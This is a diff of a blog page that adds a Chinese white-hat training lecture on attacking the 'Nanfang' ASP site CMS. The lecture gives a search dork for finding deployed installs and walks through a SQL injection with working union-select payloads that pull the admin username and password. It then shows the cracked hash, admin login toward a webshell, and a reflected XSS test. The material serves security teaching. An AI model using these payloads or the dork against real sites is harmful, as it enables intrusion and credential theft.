@@ -178,7 +178,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">November 12, 2019&nbsp;&nbsp;17:03:19</a>
+                        Date: <a href="#">December 4, 2019&nbsp;&nbsp;19:00:32</a>
                         </span>
                     
                     
@@ -187,8 +187,43 @@
         </header>
 
         <div class="post-content">
-            <hr>
-<h2 id="title-Misc2-编码与密码"><a href="#title-Misc2-编码与密码" class="headerlink" title="title:Misc2.编码与密码"></a>title:Misc2.编码与密码</h2><pre><code>https://bbs.zkaq.cn/t/4132.html</code></pre><p>本人在某安全社区写的文章</p>
+            <h1 id="米斯特白帽培训讲义-实战篇-南方-0day"><a href="#米斯特白帽培训讲义-实战篇-南方-0day" class="headerlink" title="米斯特白帽培训讲义 实战篇 南方 0day"></a>米斯特白帽培训讲义 实战篇 南方 0day</h1><blockquote>
+<p>讲师：<a href="https://www.zhihu.com/people/gh0stkey/answers" target="_blank" rel="noopener">gh0stkey</a></p>
+</blockquote>
+<blockquote>
+<p>整理：<a href="https://github.com/" target="_blank" rel="noopener">飞龙</a></p>
+</blockquote>
+<blockquote>
+<p>协议：<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></p>
+</blockquote>
+<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p>关键词：<code>inurl:&quot;HomeMarket.asp&quot;</code>。</p>
+<h2 id="下载与部署"><a href="#下载与部署" class="headerlink" title="下载与部署"></a>下载与部署</h2><p><a href="http://www.jb51.net/article/5336.htm" target="_blank" rel="noopener">http://www.jb51.net/article/5336.htm</a></p>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>我们打算检测其中的 SQL 注入漏洞，由于 ASP 代码基本没有什么好的过滤，一般一查一个准。为了搜索 SQL 注入漏洞，我们可以使用<code>sql</code>、<code>conn</code>这类名称、或者<code>execute</code>这类函数来定位到数据库查询低吗位置。</p>
+<p>比如在<code>NewsType.asp</code>的 14 ~ 32 行，我们发现了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">&apos; ...</span><br><span class="line">BigClass=request(&quot;BigClass&quot;)</span><br><span class="line">SmallClass=request(&quot;SmallClass&quot;)</span><br><span class="line">&apos; ...</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">if BigClass&lt;&gt;&quot;&quot; and SmallClass&lt;&gt;&quot;&quot; then</span><br><span class="line">sql=&quot;select  * from News where BigClassName=&apos;&quot;&amp; BigClass &amp;&quot;&apos; and  SmallClassName=&apos;&quot;&amp; SmallClass &amp;&quot;&apos; order by AddDate desc&quot;</span><br><span class="line">set rs=conn.execute(sql)</span><br><span class="line">do while not rs.eof </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们看到这是文本型的参数，也就是说我们注入的时候要想办法闭合单引号。而且它用的是 Access 数据库，我们没办法像 MySQL 和 SQLServer 那样使用<code>--</code>来注释。</p>
+<p>我们照旧为<code>SmallClass</code>输入<code>&#39; and &#39;1&#39;=&#39;1</code>，构造的 URL 为<code>NewsType.asp?SmallClass=%27%20and%20%271%27=%271</code>，发现正常。</p>
+<p><img src="http://ww3.sinaimg.cn/large/841aea59jw1fb46h33bq8j20vm07qwfu.jpg" alt></p>
+<p>输入<code>&#39; and &#39;1&#39;=&#39;2</code>，构造的 URL 为<code>NewsType.asp?SmallClass=%27%20and%20%271%27=%272</code>，发现错误。</p>
+<p><img src="http://ww1.sinaimg.cn/large/841aea59jw1fb46jsnmdmj20vp066q39.jpg" alt></p>
+<p>接下来我们查看源码目录下的<code>Databases/0791idc.mdb</code>，知道了<code>News</code>表一共有十个字段。</p>
+<p>之后输入<code>&#39; and 1=2 union select 1,2,3,4,5,6,7,8,9,0 from admin where &#39;1&#39;=&#39;1</code>，发现显示 2 和 9：</p>
+<p><img src="http://ww3.sinaimg.cn/large/841aea59jw1fb46jvpacxj20vo059dgj.jpg" alt></p>
+<p>之后就很简单了，我们先看看<code>admin</code>表里面的用户名和密码都叫做啥。我们把 2 替换为<code>username</code>，9 替换为<code>password</code>。</p>
+<p><img src="http://ww1.sinaimg.cn/large/841aea59jw1fb46jzq1evj20w205l3za.jpg" alt></p>
+<p>然后把<code>f3a976c77dc7264c</code>送到 pmd5 解密，结果为<code>060618</code>。</p>
+<p>之后可以从<code>/admin</code>访问后台，登录并继续拿 WebShell。</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>我们点击网站右上角的“联系我们”，可以发现这个页面的 URL 中出现了这四个字，页面中也出现了这四个字。</p>
+<p><img src="http://ww2.sinaimg.cn/large/841aea59jw1fb46k305u5j20v70gcdhm.jpg" alt></p>
+<p>然后我们把 URL 中的<code>Title</code>参数改成<code>1</code>：</p>
+<p><img src="http://ww3.sinaimg.cn/large/841aea59jw1fb46k5xrwij20v90cidh9.jpg" alt></p>
+<p>这就提示我们这里面可能会出现 XSS，我们改成<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>：</p>
+<p><img src="http://ww2.sinaimg.cn/large/841aea59jw1fb46k8imfgj20hc08mq3b.jpg" alt></p>
+<p>我们看到源代码中出现了这个东西。</p>
+<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><ul>
+<li><a href="http://www.xiaoshuwu.net/black-hat-seo/" target="_blank" rel="noopener">黑帽百科：2.2 常见 0day</a></li>
+</ul>
 
         </div>
 
@@ -203,7 +238,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://yoursite.com/2019/11/12/Misc2.编码与密码/">http://yoursite.com/2019/11/12/Misc2.编码与密码/</a></span>
+                        <span><a href="http://yoursite.com/2019/12/04/实战篇 南方 0day/">http://yoursite.com/2019/12/04/实战篇 南方 0day/</a></span>
                     </p>
                 
                 
@@ -236,10 +271,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2019/12/04/工具篇 AWVS/"></a>
+                <a class="prev" rel="prev" href="/2019/12/04/实战篇 余闻同学录/"></a>
             
             
-            <a class="next" rel="next" href="/2019/11/12/2019网络空间竞赛Misc1.编码/">2019网络空间竞赛Misc1.编码</a>
+            <a class="next" rel="next" href="/2019/12/04/实战篇 捷达系统/"></a>
             
         </section>
 
